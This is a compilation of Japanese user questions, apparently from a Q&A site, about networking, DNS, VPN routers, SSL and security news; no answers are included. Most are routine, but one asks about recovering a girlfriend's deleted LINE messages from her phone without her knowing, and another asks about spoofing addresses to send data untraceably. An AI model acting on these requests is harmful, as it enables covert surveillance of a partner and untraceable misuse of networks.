質問させてください。 ドメイン（AD)に参加しているPC（WindowsXP SP2）に、ICSを利用してドメインに参加していないPCをネットワークに参加させた場合、ICSでつながっているPCはドメインには参加していないままでしょうか？ それとも踏み台にしているドメイン参加PCの権限でドメインに参加することになるのでしょうか？ 特にファイルサーバ等のドメインアカウントでアクセス制限管理がなされている共有資産へのアクセスについて回答をいただけると助かります。 ご教授よろしくお願いいたします。
google web search api を使用していたですがプログラムミスにより無限ループが起こりgoogleの方から自身のサーバに対してブロックかけられてしまいました。 ブロックを解除してもらうにはどうすればいいですか？
fon free internetってなんですか？ インターネットの種類らしいんですけど、これがいつもインターネット一時停止の 原因になってるようなんです。 削除みたいなことできるなら消しちゃいたいのですが、どうやればいいのか わかりません。 アドバイスお願いします。
リモートホストから会社名や学校名がわかるという記述をよく見ますが、これって全部にあてはまることですか？固定IPを取得しているとか自社サーバー構築管理しているとかそういうケースに多いってことですか？
「プロバイダのリモートホスト」でWebを閲覧することと、「ドメイン名を使ったリモートホスト」でWebを閲覧することはなにがどう違うのですか？
認識があっているか教えてください。 社内LAN（仮にA社）のクライアントPCから外部サイト（仮にB社のWebサイト）を閲覧したとします。 A社のインターネットの契約はISPとの一般的なもので、メールアドレスの発行やサイト開設等のレンタルサーバーの使用やドメインの取得はないものとします。 この時、ルーターにはISPのDNSサーバーからグローバルIPとドメインが割り振られ、それらをもとにして他の複数のサーバーを経由し、B社のWebサイト（B社は別のISPからレンタルサーバーとドメイン取得の契約をしている）にたどりつきます。 また、A社に割り振られたグローバルIPとドメインはA社のISPが管理しており、その所有者はA社ではなくA社のISPということになります。そしてこの割り振られたグローバルIPとドメインは定期的に変更されるためA社にとっては半永久的なものとはなりません。 この時、B社が自社のWebサイトにアクセス解析をかけ、それにより取得したA社のドメインをwhois検索をかけてもそのドメインの所有者はA社であるためA社の情報（会社名等）がB社に知られることはありません。 但し、A社が固有グローバルIPやドメインも取得しており、DNSサーバーを自社で構築している場合はA社の情報がわかることとなります。 こんなに認識であっていますでしょうか？
アメリカの盗聴を逆に利用した商売が出てきています。 http://gigazine.net/news/20131002-mcafee-anti-ns … や、データセンターをドイツにつくる話しなど。 ＯＳでは、ＬＩＮＵＸの作成にもＮＳＡがボランティアで参加している。 ＭＳも盗聴には協力的。 などのニュースが流れています。 アメリカでの法律には、口止め法（正確な名前は分かりません。）があるので、 この法律がある限り、ネットワークの世界でのアメリカの信頼はなくなり続けると思っています。 この機会に、トロンがＰＣのＯＳとして復活する可能性はあるのでしょうか？
TCP/IPの書籍を読んでいて思ったんですが 仮にデフォルトゲートウェイのルータのIPやサブネット、MACアドレスが判明していて 1500バイト以下のデータを送信するとします。 その場合、送信元MACアドレスとIPにでたらめな値を入れても送信できるんでしょうか？ TCPだと3ウェイハンドシェイクが失敗してコネクション自体が確立できない気がしますが UDPならコネクションレスなので送信できる気がします。 仮に送信できるとするとIPとMACアドレス両方偽装できるので 送信元の判別は不可能になってしまいます。 ということはUDPでローカルPCから一方的にデータを送れば身元は特定されないんでしょうか？
会社のパソコンですが、会社のパソコン管理・セキュリティポリシーに従わず、個人所有のソフトウェアやクラウドサービスを勝手に導入している人がいます。 会社では、無許可のクラウドサービスやグループウェアの使用、および無許可・業務外使用のソフトウェアの導入を禁止しています。あたりまえでしょうけど。 その方たちの言い分は以下のようなものなのですが、論破していただけますでしょうか。 各人のスマホやパソコンにはLINEやDropBox等がインストールされています。アカウントは管理者権限が与えられています。 またその人たちは、先日の2ちゃんねる有料閲覧会員の情報漏えいの件は知っていましたが、少し前のGoogleDriveのグループアクセスポリシーの件、だいぶ前のDropBox、Twitterのパスワード漏えいの事件を知りません。 加えて、何かあったら自分が責任を取るとはいうものの、会社としてパソコンを使用しているし、会社で社内外の通信を管理しているのだから、自分が勝手に何をしようとも、会社とその主幹部署が問題が発生しないような仕組みを構築しておくべきだという考えです。 会社のパソコン管理主幹部署がどうなっているかとか、上司がどうだとかは触れないでください…。 １）クラウドを（勝手に）通常業務に組み込んでいる。なくなったら仕事ができない ２）無許可のサービスを削除した際の代替策を提案しろ ３）会社で許可済みのサービスは、フォルダの暗号化など漏えい前提とした作業が煩雑になるので使用したくない ４）会社で許可済みのサービスは、会社にアクセスログが取られる。心外だ。（実際はサービスを使用しなくてもログは取られていますが…） ５）仕事を処理するのが優先なので仕方がない。（社内外の）みんなやってる ６）個人所有のスマホに関係者のアドレスを入れている。今更パソコンからLINE等を削除したところで意味がないから削除しない ７）パソコンでDropBoxやGoogleDriveを使用している。どちらかを削除しても漏れたものは漏れたろうからどちらも削除しない ８）上司にも主幹部署にも言うな ９）何かあったら責任を取る（何かあった時点で遅いということを理解してくれない） 10）会社のドメインを使用していないから大丈夫。変な事していないから大丈夫 異常です。いや、以上です。
お世話になっております。 現在、フレッツＶＰＮワイドを利用しておりますが（下記Ａ拠点）、今回拠点を追加することになりました。しかし、今回追加する拠点側（下記Ｂ拠点）でも既存のグループがあります。 フレッツＶＰＮワイドのＨＰ上では１つの提供回線で異なるグループの使用は可能との記載がありましたが、どなたか実際このような環境でご利用されている方はおられますでしょうか。 その際、留意する点などございましたご教授願います。 Ａ拠点（管理者側）では３つの出先とのＶＰＮ環境構築済 Ｂ拠点（今回追加拠点）でも３つの出先でＶＰＮ環境構築済
自宅LAN内にDNSサーバーをたてたくて、ググりながらゾーンファイルを書いてるのですが、 正しいのか自信がありません。 おかしくないか見てもらえないでしょうか。 hoge.co.jp、dev1.hoge.co.jp、svn.hoge.co.jp などにアクセスしたとき、 192.168.1.100 にとばすようにしたいです。 ※最初間違ってハードウェア（サーバー）カテゴリであげてしまったので、 そちらは削除してもう一度あげなおしています。 <named.confの記述> ---------------------- zone "hoge.co.jp" IN { type master; file "hoge.co.jp.zone"; }; zone "1.168.192.in-addr.arpa" IN { type master; file "hoge.co.jp.in-addr.arpa.zone"; }; <hoge.co.jp.zone の内容> -------------------- $TTL 86400 @ IN SOA dns yamamoto ( 2013290000 ; Serial 28800 ; Refresh 14400 ; Retry 3600000 ; Expire 86400 ) ; Minimum IN NS dns @ IN A 192.168.1.100 dns IN A 192.168.1.100 dev1 IN A 192.168.1.100 dev2 IN A 192.168.1.100 dev3 IN A 192.168.1.100 svn IN A 192.168.1.100 <hoge.co.jp.in-addr.arpa.zone の内容> ------------------------------------- $TTL 86400 @ IN SOA dns yamamoto ( 2013290000 ; Serial 28800 ; Refresh 14400 ; Retry 3600000 ; Expire 86400 ) ; Minimum IN NS dns 100 IN PTR hoge.co.jp.
http://oshiete.goo.ne.jp/qa/8278963.html ↑この質問をしたものなのですが、マクロでいろいろな作業を自動化するのに、パスワードとIDを別で入力してサブミットを押すのを減らしたいと考えています。 そのためには、URLで直接IDとPASSが埋め込んであるURLを使いたいと考えています。 そこで、パケット通信解析ソフトなのですが、そういった、パスワードをとIDの部分を見つける方法が簡単なフリーのパケット通信解析ソフトはあるでしょうか？
このサイトでもログイン時にマウスクリックするとIDとパスワードが自動表示されます。 この機能はどこがサジェストしているのですか、 OS、サイト自身が過去のデータから、かな漢字変換のオートサジェスト機能。 この変かと想像するのですがかな漢字変換のオートサジェストだとするとサイトが異なるのを全て記録しているのでしょうか？ また銀行などセキュリティのきついところでも簡単にIDとパスワードが出てきます。 これだと他人がクリックしてもサイトに入ることが出来る事になります その辺のセキュリティはどうなるのでしょうか
FTPソフトの乗り換えを検討しています。 FileZillaはマスターパスワードがなくパスワードが平文保存だから、危険みたいなのを見たのですが、sftpで接続したか否かにかかわらず、これはあまりよくないということなのでしょうか？それとも、sftpで接続すれば問題ありませんか？ただし、うちで使っているレンタルサーバーのひとつが、sshに対応しておらずsftpが使えないことが判明しました。 FileZillaにするか、transmitやforkliftにするか迷っています。
素人ですが、教えてください。 アクセス解析から会社名ぐらいまではわかるといいますが、それは「ホスト名の一部に具体的な会社名を使用している場合にそれから推測できる」という意味ですか？ また、電話番号がわかるということも聞いたことがあるのですが、それは「ホスト名から会社名を推測してその会社のHPを見て電話番号がわかる」ということなのでしょうか？ 宜しくお願いします。
Twitterをみていると短縮URLというものが出てきます。 そこで初めて短縮URLというものを知りました。 これは正規のURLをある変換に基づいて固有のURLに 変換すると思っていました。 ところがon.ft.com/17H7DyNに対してpixivで変換すると http://p.tl/qP7oとなり、全然別の短縮URLを生成しました。 これで私の考えは完全に否定されパニックになってしまいました。 短縮URLは無数に存在するのでしょうか。 だとしたら、正規のURLへの戻し方も複数あるのでしょうか？
ファイルの共有について教えてください。 ドメイン環境でデータ受け渡しのためにフォルダを共有しようと考えています。 検索して調べたところ、ファイル共有には以下２つの方法があることを知りました。 (1)対象フォルダを右クリックして、共有(H)から共有するユーザーを選択する (2)対象フォルダを右クリックして、プロパティの"共有"から"詳細な共有(D)"を選び、共有するユーザーを選択する わざわざ方法が違うということは、それぞれ使い勝手が異なるのだろうと思いますが その事情は検索してもこれといった回答に巡り合えませんでした。 （後者はフォルダに任意の共有名をつけることが出来るようですが、それが大きな違いなのでしょうか？） ご存知の方、それぞれの利点を教えて頂けると幸いです。 私の環境はWindows Vista Professionalです。 よろしくお願いいたします。
URLにユーザー名、パスワードを含めてアクセスする方法。 FTPをブラウザでアクセスする時に、 アドレスバーに「ftp://△△△:□□□@ftp.○○○.co.jp」 △がユーザー名 □がパスワード と入力すれば、面倒なパスワードやユーザー名の入力なしになかにはいれる事を始めて知りました。 この方法は、その他のパスワードが必要なサイトでも活用できるのかと試して見たのですが、ダメでした。なぜでしょうか？
S/MIME機能の拡張を考えて　CryptAPI　の資料を読んでいる所です。 最近、 http://itpro.nikkeibp.co.jp/article/NEWS/2013092 … こんな話題がありますが、 Windows の　CryptoAPI　は大丈夫でしょうか？
RT107eというルータの設定について、解らない事だらけで誰か教えてください。 特定のポート（今回はFTP）のみVPN経由で外部へアクセスしたいです。 【拠点A】 LAN IP:192.168.1.0/24 ルータIP:192.168.1.1 クライアントPCAの設定 _IP:192.168.1.2 _NET MASK:255.255.255.0 _GW:192.168.1.1 【拠点B】 LAN IP:192.168.2.0/24 ルータIP:192.168.2.1 クライアントPCBの設定 _IP:192.168.2.2 _NET MASK:255.255.255.0 _GW:192.168.2.1 ※DNSはプロバイダから教えてもらったアドレスを設定しています。 課題が色々あって、簡単なところから始めています。 今までにできた事です。 ・拠点A、拠点Bともにインターネット接続ができていて、両拠点にあるクライアントPCから外部WEBサーバ（yahooとか）接続できるようになりました。 ・拠点Aと拠点BはVPNで接続できるよう設定できました。 ・ファイル共有は拠点Aと拠点Bで問題なく接続できるよう設定できました。 ・両拠点にあるWEBサーバ（クライアントAとBに構築）も相互にアクセスできるよう設定できました。 今度は、拠点AからFTPを使い外部のFTPサーバへアクセスする時、拠点Aから外部へ接続するのではなく、一旦、VPNにて拠点Bを介して外部のFTPサーバへアクセスさせたいです。 ルーティングの設定かと思うんですけど、さっぱり解りません。 （クライアントも何か設定する必要があるのでしょうか？） 一応、拠点Aから下記設定にて外部のFTPサーバへアクセスする事はできました。 拠点Aの設定は大体こんな感じです。 （何やってんの？っていう突っ込みは沢山あります・・・） ip route 192.168.2.0/24 gateway tunnel 1 ip lan1 address 192.168.1.0/24 provider filter routing connection provider lan1 name LAN: provider lan2 name PPPoE/0/1/5/0/0:Base1 pp select 1 ・・・ ip pp secure filter in 120 121 123 124 125 201 ip pp secure filter out 120 121 123 124 125 999 dynamic 301 302 ・・・ ip pp nat descriptor 10 pp enable 1 provider set 1 Base1 provider dns server pp 1 1 provider select 1 no tunnel enable all tunnel select 1 tunnel name Base2 ipsec tunnel 1 ipsec sa policy 1 1 esp aes-cbc sha-hmac ipsec ike keepalive log 1 off ipsec ike keepalive use 1 on heartbeat 10 6 ipsec ike local address 1 192.168.2.1 ipsec ike local id 1 192.168.2.0/24 ipsec ike pre-shared-key 1 text Base1_key ipsec ike remote address 1 192.168.2.1 ip tunnel tcp mss limit auto tunnel enable 1 ip filter 120 reject * * udp,tcp 135 * ip filter 121 reject * * udp,tcp * 135 ip filter 122 reject * * udp,tcp netbios_ns-netbios_ssn * ip filter 123 reject * * udp,tcp * netbios_ns-netbios_ssn ip filter 124 reject * * udp,tcp 445 * ip filter 125 reject * * udp,tcp * 445 ip filter 201 pass * 192.168.1.2 tcp * www ip filter 999 pass * * * * * ip filter dynamic 301 * * ftp ip filter dynamic 302 * * www nat descriptor type 10 masquerade nat descriptor masquerade incoming 10 forward 192.168.1.2 nat descriptor masquerade static 10 1 192.168.1.2 tcp www tftp host 192.168.1.2 どのような設定をすれば良いのでしょうか？ その他、ツッコミなどもお願いします。 よろしくお願いします。
FTPダウンロードの減少について質問です。 あまり専門的なものは除き、市販されているソフトウェアのアップデータ等の配布元として、以前はFTPダウンロードが多かったような気がしますが、今はHTTPダウンロードが増えたような気がします。 あまり詳しくないですが、企業でもFTPダウンロードはブロックしているところが多いようです。 これは、FTPの脆弱性やFTPに関わるウイルスの増加に伴うものなのでしょうか。 ※FTPダウンロードはFTPクライアントではなくブラウザを使用しています。
なぜhttpはルータ越しに接続できるのにSMBなどのファイル共有はルータ越しではできないのですか？
AからBへ公開鍵暗号方式でメールを送信する場合、Aはどの鍵を使うか？という問題で、解答は「Bの公開鍵」が正解なのですが、これはどうしてそういう答えになるのか、理解が出来ていません。 ご教示、よろしくお願いいたします。 また、同じAからBへ秘密鍵暗号方式でメールを送信する場合はどうなるのかも、併せてご教示頂ける 幸いです。
tracerouteで分かるように、サイトとの通信において複数の地点を経由していますが、その経由地でパケットのデータ部分を改ざんされ、マルウェアに感染することがあるかどうか、ご教授ください。 パケットの経由地では ○パケットを転送するだけのルーター ○[ルーティング機能が付いていると同時に経由データを保存できる]サーバー だけではなく、 実は、 ○パケットのデータ部分を改ざんできるプロキシサーバーが設置されている といったケースです。 日本国内の経由地であれば、おそらく公的機関または大手プロバイダーが管理していてパケット改ざんによるマルウェア感染はないと思います。 ただ、外国の経由地の管理の実態が分からないので、その外国の経由地でデータ部分の改ざんはされていないのか、気になります。(特に中国・ロシアなどの危険な国) 外国でも大手プロバイダーまたは公的な機関が管理しているならマルウェア感染はないと思うのですが。。。。。 また、SSLでは経由地でのパケットのデータ部分の改ざんあるいはデータ部分の追加によるマルウェア感染は不可能かどうかについてもご教授ください。
会社で管理されているgoogleapps のアカウントから閲覧したWEB履歴って会社の管理者に見られたりしますか？一応アカウントの管理ページから削除しているのですが、管理サーバーには残ったりするのでしょうか。。先日他の人がシークレットモードを使っていたので気になりました。ご回答お願いします！
暗号化されていない通信を傍受される可能性について教えてください。 基本的に通信は自宅のパソコンからのプライベートなもので、ビジネス用のものではありません。 SSLが採用されていない[検索エンジンでの検索,メールでの送受信、サイトへのアクセス]という通信についての傍受を心配しています。 通常、通信は複数のルーターを経由しますが、そのルーターの運営元のほとんどは、信頼できる公的な機関または大手プロバイダー関連なのでしょうか？ だとすれば、SSLが採用されていなくても過度な心配は不要になるのですが.....
SSLには通信内容の改ざん検知機能がついていますが、 実際に改ざんが検知された場合、次にどのように振舞うのでしょうか？ SSLを強制切断するのですか？ 再送するのでしょうか？ よろしくお願いします。
レンタルサーバを利用しています。専用サーバ利用です。CentOS release 4.4です。 複数のドメインをここで管理していて、攻撃を受けているのはその1つのドメインで、メインで利用している物です。 一昨日夜から攻撃が始まりました。 最初は攻撃と気が付かずただのサーバ不調によるダウンと思っていました。 自分でコントロールパネルより再起動を試みたのですが、症状が改善しなかったので、サーバ管理会社に確認してもらった所、攻撃を受けているとのことでした。 「海外からの不正なアクセスが行われており、Apacheの同時接続数が超過したことが原因で、ウェブサイトへのアクセスがつながりにくい状態となりました。」 「サーバーやサービスに対するサービス妨害攻撃サービスなどに対して許容量を超える要求を送出し、サービスの処理可能量を超えさせ、正規の要求を処理させないものがあります。」 と言うものだそうです。 (カッコ内については管理会社からのコメント。色々やりとりしているので、書き込まれた順番はまちまちです) アクセスログを見ると、 xxx.xxx.xxx.xxx - - [20/Sep/2013:02:03:40 +0900] "POST / HTTP/1.1" 200 11836 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" (IPアドレス以外はすべて同じ) が、1秒に4～6回くらいの数でアクセスしています。 「再起動を行わせて頂きましたが、すぐに不正なアクセスが行われ、MaxClients(同時接続数)を超過してしまうことで、再びウェブサーバーが不安定な状態となってしまいます。」 また、 「MaxClientsを増やすことは通常はMaxClientsのエラーの解決策でございますが、明らかに不正な接続へのリクエストとして受け付ける数を増やすこととなり、リクエストに割り当てられたメモリ使用も多くなるため、メモリ不足となってしまう可能性が考えられます。」 さらに、 「根本的な解決策がないため、○○○.comドメインの廃止」 「高スペックのサーバーへの移設など、ネットワーク機器でのブロックが可能なサービスへの移設なども対策として挙げられます。」 と回答されました。 現状では、 chmod 000 /var/www/vhosts/○○○.com の実行。(これは、不正アクセスを受け、情報を書き換えられるのを防ぐためと考えてOKでしょうか?) DNSゾーンの削除(○○○.com. 600 A xxx.xxx.xxx.xxx等) を行い、他のドメインは正常動作、メインサイトのみ閉鎖(403)となっています。 今回の件を自分で解決方法を探していると日付が近い以下の情報を確認しました。 9月18日に関連したサイバー攻撃に関しての注意喚起 http://www.lac.co.jp/security/alert/2013/09/12_a … これではないかと思い、日付が変わった本日1:00頃再度DNSレコードを戻し、公開してみたのですが、数分も経たず攻撃がスタートしてしまいました。 前置きが長くなりましたが… この状態で何か解決策はありませんか? 管理会社が指定した解決方法は、 ・○○○.comドメインの廃止(さすがに無理です) ・高スペックのサーバーへの移設(予算的に厳しいです) と、問題があり、ちょっと難しいです。 .htaccessで海外のアクセスを遮断と考えたのですが、そもそも".htaccessにアクセスする=同時接続数を超える事になる"ので意味は無いですよね… 他に何かいい方法は無いでしょうか? サーバ管理に関しては初心者レベルです。 そのため、必要な情報が記載されていないかもしれませんので、その時は指摘をお願いします。
閲覧有難うございます。 Amazon　EC2でFTP(ソフトはWinSCPを使用）から新規ディレクトリ作成しようと思いましたが、 次のようなエラーが出てしまい困っています。 ------ 権限がありません エラーコード: 3 サーバからのエラーメッセージ: Permission denied リクエストコード: 14 ------ ちなみに、"ec2-user"ユーザーでログインしています。 サーバー管理自体がほとんど経験なく困っています。 解決方法を教えていただけると大変助かります。 何卒よろしくお願い申し上げます。
ネームサーバの調べ方について教えてください。 http://www.intodns.com/yahoo.co.jp Yahoo を例にしてみました。 ここで、 1)「Domain NS records」という欄と 2)「NS records from your nameservers」という欄があり どちらも、ネームサーバなのですが、 1)は、ドメインのwhois情報に載っているネームサーバ？ 2)は、DNSサーバからのレコードに記載されているネームサーバ であることまでは理解しています。 1)は、どうやったら調べられるのでしょうか。 whois を叩いて、ネームサーバの欄を整形して見るくらいしか無いのでしょうか。 効率的に調べられるコマンドや方法などあれば教えてください。 2)は、 dig NS [対象ドメイン] で得られることは了解です。 今の困りごととして、1)と2)が異なるドメインが複数あって、修正のためにそれを調査したいというのが目的です。 どうぞよろしくお願いいたします。
1台目のパソコン(WindowsXP)で、ノートンインターネットセキュリティ2007のディスク版購入以来、プログラムアップデートしながらクレジットカード自動延長で使用中・・・アカウントA(期限は毎年12月末) その後、パソコン2台目(Windows7)を購入、ノートンインターネットセキュリティ2011を別のアカウントでダウンロード購入、クレジットカード自動延長で使用中・・・アカウントB(期限は毎年9月末) アカウントは2つ作ってしまったけど、同じカードで支払ってきました。最近、アカウントBは最大3台のパソコンで同時使用可だということがわかりました。 1台目のパソコンでアカウントAをやめてアカウントBを使うようにして、無事にそれができてからアカウントAを解約したいのですが、具体的な手順がわかる方、教えてください。
さくらの共有サーバーを借りて、独自ドメインでサイトを運用しています。 そのサイトにBasic認証を設定したところ、独自ドメインとさくらドメインとで2度認証が求められました。 1度の認証で済むように設定することは可能でしょうか？ 因みに、独自、さくらの順で求められます。 なお、さくらの認証はキャンセルしてもサイトはIEでは表示され、 ChromeではCSSが利いていないかたちで表示されます。
日本国内の無料VPNサービスで VPNの入口(VPNアクセスGW)と出口(外向けGW)が別アドレスの無料VPNサービスはありますでしょうか？ 有料だとあるのでしょうが、無料では別アドレスのものが見つかりません。 PPTPでもOpenVPNでもどちらでも構いません。 自分が知っているのは以下の無料VPNサービスですが、どちらのサービスも VPNの入り口(VPNアクセスGW)と出口(外向けGW)が同じアドレス（兼用）のものでした。 ・つながるもん ・VPNGATE(VPN Gate 学術実験サービス)
セキュリティソフトは必ずインストールしなければならないものでしょうか。OSはWin7です。怪しげなソフトはインストールすることはありません。ファイル交換とかは。 　セキュリティソフトをインストールするとWordが奇妙な挙動をするのです。ここ２日ほどはセキュリティソフトはアンインストールしてあります。 　インターネットバンキングは頻繁にします。
自宅のL2スイッチでポートスキャンをやってみました。 TCPの結果ですが、443というポートがopenになっており、 サービスはtcpwrappedというものでした。 このL2スイッチは、知人より譲り受けたもので、 正直ポートの設定などは触っていないとのことでした。 またその知人が、ポートについて詳しくなかったので、 ネットで調べてみたところ、443は"https"という記述が多く、 ポートスキャンした結果と差異があり、 この結果をどのように解釈してよいのか分かりません。 tcpwrappedについても調べてみましたが、 英字が多くて断念しています。 tcpwrappedとは何を意味するのでしょう？ そしてなぜ、httpsと表示されなかったのでしょうか？ ホントはhttpsではないのでしょうか？ ちなみにポートスキャンに使用したツールはnmapです。 ポートに詳しい方、nmapの使用経験のある方、 是非とも、ご教授下さい。
私には今、付き合って4年の彼女がいます。ですがこの4年間で、私は6回も浮気をされてきました。毎回許しているのですが、私は外資系の会社員という事もあり、今、外国に1年間の長期出張に出かけています。 私は彼女との結婚を本気で考えていますが、この一年の間で彼女が浮気をしていたら、私は完全に縁を切る事に決めました。 本題に入りますと、帰国した時にiPhoneアナライザーを使って彼女の携帯を調べようと思います。 ですが、彼女は常にやましいラインの履歴は消しています。 そのバックアップせずに普通に履歴を消した人やブロックした人の履歴も見る事は可能なのでしょうか？ バックアップせずに消した履歴に関してはどのサイトを見てもみつかりませんでした。 困っています。詳しい方、回答をお願いします。
初歩的な質問なのですが、 コマンドプロンプトで OpenSSL> にするにはどうしたらいいでしょうか？ windows 32bitのOpensslを使用しています。
どうも一種のスパイウェアに取り付かれたようで、つい数時間前より、様々なサイトで左下に添付画像のようなポップアップ広告がでます。これを削除する方法を教えてください。 IE、FireFoxでは出るようです。Chromeは今のところは出ていませんが、実際のところは分かりません。 http://detail.chiebukuro.yahoo.co.jp/qa/question … http://milksizegene.blog.fc2.com/blog-entry-104. … このあたりを見て、yontoo とやらが怪しいのかと思いましたが、記載された対応策（キャッシュ・クッキーのクリア等）を行いパソコン自体を再起動しても状況は変わりません。またIEでアドオンの管理などを見ても、yontooに関連しそうなものはありません。 タスクマネージャーのプロセスは、ざっと見る限り、yantooに関係しそうなものは見つかりません。コントロールパネルから「プログラムの追加削除」を見ても、ここ数日でソフトがインストールされた形跡もなく、当然yantooと疑われるものもありません。 出てくるポップアップはフラッシュで表示されているようで、URLなどは不明です。ウィルスや性能低下を脅すような広告の他、AUやFinnair の広告も出てきており、それらはマウスを合わせると AdChoicesと表示されます。AUの広告はクリックすると、ちゃんとAUの公式ページに飛ぶようですが、AUの公式ページでもFinnairの広告が出ています。 上記のような状況ですが、何か対応策はないでしょうか？ よろしくお願いします。
どうにもならなくて困っています助けてください 最近PS3でFF14を始めたんですが、頻繁にPS3のネットワークから切断されます。 アクセスポイントから切断されましたとか、メディアサーバーから切断されましたなど表示されます PCのネット回線も頻繁に切断されてしまいます＞＜； プレイし始めた最初の頃はこんなことなかったんですが・・・ 友達とスカイプしながらだとPCもPS3も落ちることはないです ノートパソコンもPS3も無線で二階で使用し、ルーターなどは一階に設置してあります。 PCはずっと二階で使っていて落とされることなんてめったにありませんでした ルーターは電源落として(コンセントを抜く)数秒後に入れ直したんですが駄目です コンピューター関係はあんまり得意ではないのでわかりやすくどうしたら治るのか教えてください お願いします
お世話になります。 YAMAHAのVPNルーターRTX1100で、不要なポートのフィルタリング設定を行っております。 WindowsXPを1台で、接続テストを行い、ログを取りました。 WindowsXPが使用するエフェメラルポートは、1025～5000、WindowsVista以降のOSが使用するエフェメラルポートエフェメラルポートは、49152～65535、とのこと。 エフェメラルポート http://ja.wikipedia.org/wiki/%E3%82%A8%E3%83%95% … ここから、5001～65535のポートを、TCP、UDP、IN、OUT、すべてにおいて閉鎖しましたところ、インターネットに接続できませんでした。 ログを調べましたところ、WindowsXPのプライベートアドレス、5万番台ポート→DNSサーバー53番ポートへのパケットが、破棄されていました。 外部WEBサーバー80番ポートへのパケットは、すべて、1025～5000番の範囲に収まっていました。 閉鎖するポート番号を、5001～49151に変更することで、インターネットにも接続出来るようになりました。 WindowsXPの場合でも、OSのエフェメラルポートは、1025～5000ですが、それは、TCPパケットに関するお話で、DNSサーバーにアクセスするUDPパケットに関しては、49152～65535である、ということは、ありますでしょうか。 どうぞよろしくお願い致します。
Ethernet全二重では、コリジョンが発生しますか？ A B C D の4台のホストが全二重スイッチングハブにつながっているとします。 A→B の送信が行われているとき、C→D の送信を開始してもコリジョンにならない、ということは分かります。 このとき、C→B の送信が発生したら、コリジョンは発生しますか？
当方、windows7 32bitでwwwサーバを組んでいる超初心者です。 apacheは2.2.25、Active Perlは5.16.3.1で OpenSSLは1_0_1です。、 c/apache softoware Foundation c/perl c/openssl 以上の場所にインストールしています。 http://tako.jugem.cc/?eid=719 ここのサイトの説明通りにやりました。但し、openssl.cfg は c/apache softoware Foundation/apache2.2/conf/sslに入れましたが。 上記のサイトで > openssl req -config openssl.cfg -new -out ./ssl.key/server.csr 色々聞かれるので埋める とあり、色々埋めました。 Apacheのhttpd.confの変更、 httpd-ssl.confの変更も行いました。↓ SSLCertificateFile "C:/Apache Software Foundation/Apache2.2/conf/ssl/server.crt" SSLCertificateKeyFile "C:/Apache Software Foundation/Apache2.2/conf/ssl/server.key" と変更しました。 server.crtファイルも server.keyファイルも上記の場所にあるのですが、 これでapacheを起動すると The requested operation has faild! とエラーメッセージが出てしまいます。 httpd-ssl.confを有効にしなければ、apacheは普通に動いてくれます。 何が足りないのか、私には解りません。 考えうるエラーの原因が思い当たったらご教授願います。
L2スイッチが何十台もあるネットワークにVLANを追加する ことになりました。 設定変更は遠隔で出来るのですが、追加したVLANが正しく 機能するかの確認（立証）って皆さんどうしてますか？ スイッチ間は全て1Qトランク接続、 新VLANのアクセスポートを用意しないスイッチも あります。
とある出先の会社のネットワークに接続する際はネットワーク管理者に使いたいPCのmacアドレスを登録して貰って、登録されるとDHCPでIPアドレスが払い出されてインターネットに繋がるようになっております。 そのネットワークにNASを接続したのですがmacアドレスを登録して貰ったにもかかわらずDHCPでIPが払い出されない状態です。 NASのIPを固定で設定した上で、DomainViewというツールでネットワーク内のPCの情報を見るとmacアドレスが00-00-00-00-00-00と表示されます。多分これがIP払い出されない原因だとおもわれるのですがDHCPサーバにNASのMACアドレスを認識して貰って正常にIPが払い出されるようになるには無いか方法があるのでしょうか。ちなみに、そのネットワークでは固定IPが禁止されています。また、私の調べた内容で勘違い等ありましたらご教示ください。 NASはバッファローのLinkStation LS-X2.0TLです。
当方、windows7 32bitでwwwサーバを組んでいる超初心者です。 apacheは2.2.25、Active Perlは5.16.3.1で OpenSSLは1_0_1です。、 c/apache softoware Foundation c/perl c/openssl 以上の場所にインストールしています。 http://tako.jugem.cc/?eid=719 これの通りやって openssl versionとコマンド入力しても問題は発生しませんでした。 ここまでは順調でした。 しかし 私のダウンロードしたOpenSSLをインストールしても、 openssl.confがなかったので http://www.gadgety.net/shin/tips/win/apache2.html のソースをコピーペーストして、 openssl.confとしてc/apache softoware Foundation/apache2.2/conf/sslフォルダに 入れました。 openssl req -config openssl.cfg -new -out ./ssl.key/server.csrというコマンドを DOS窓に打ち込んでも指定されたパスが見つかりません。とメッセージが出ます。 私の頭で考えられるのはopenssl.confファイルの場所が違う、或いは拡張子の問題か？ と考えていますが、お手上げ状態です。 なにか、これを見てお分かりになった方、教えてくださいませんか？ 何が間違っているのでしょうか？
当方、windows7 32bitでwwwサーバを組んでいる超初心者です。 apacheは2.2.25、Active Perlは5.16.3.1で c/apache softoware Foundation c/perl c/openssl 以上の場所にインストールしています。 今回インストールしたのはOpenssl1_0_1で、 C:\OpenSSL\bin>openssl versionと入力すると、 WARNING: can't open config file: /usr/local/ssl/openssl.conf というメッセージが出るのですが、これはどのような意味を持つのでしょうか。 対処方法をご教授お願いします。
windows7　32bitでサーバを初めて組む超初心者です。 apacheは2.2.25でActive Perlは5.16.3.1です。 インストールするのは以下のファイルです。 Win32OpenSSL_Light-1_0_1 これをインストールしようとすると、途中で質問を聞かれます。 copy OpenSSL DLLs to The windows system directory The OpenSSL binaries(/bin)directory の二つのうち、一つを選択しなければ ならないようです。どちらを選択すれば良いのでしょうか？ ちなみにapacheはC/apache Softewre Foundation/Apache2.2となっており、 PerlはC/Perlとなっております。
linuxサーバーを使用して、pppoe接続しております。 しかしmessagesログを見ると以下のようなログが記録されておりますが、原因がよく分かりません。（一部数字等を変更しております） pppd[10000]: LCP: timeout sending Config-Requests pppd[10000]: Connection terminated. pppd[10000]: Modem hangup pppd[10000]: PPP session is 111111 pppd[10000]: Using interface ppp1 pppd[10000]: Connect: ppp1 <--> eth1 これを見る限り、ppp1で接続出来てないような感じなのですが、現在の接続はppp0でeth1を使用して接続出来ております。 もちろん/etc/sysconfig/network-scripts/内にppp1の設定ファイルもございません。 このような場合、どこの設定を見ればいいのでしょうか。 どなたかよろしくお願いいたします。
http://news.guideme.jp/kiji/eeb5dc73a8e03c8479ff … にあるのですが、 、NSAは約2億5000万ドルを費して、国際暗号標準 および製品を弱体化させ、NSAが解読できるようにした。 あるケースでは、2007年にMicrosoftの技術者が致命的セキュリティー 欠陥をみつけたところ、それは当初NSAが国際標準化グループに「強要」 したものだった。 これって、本当でしょうか？ また、何を調べれば確認できるでしょうか？
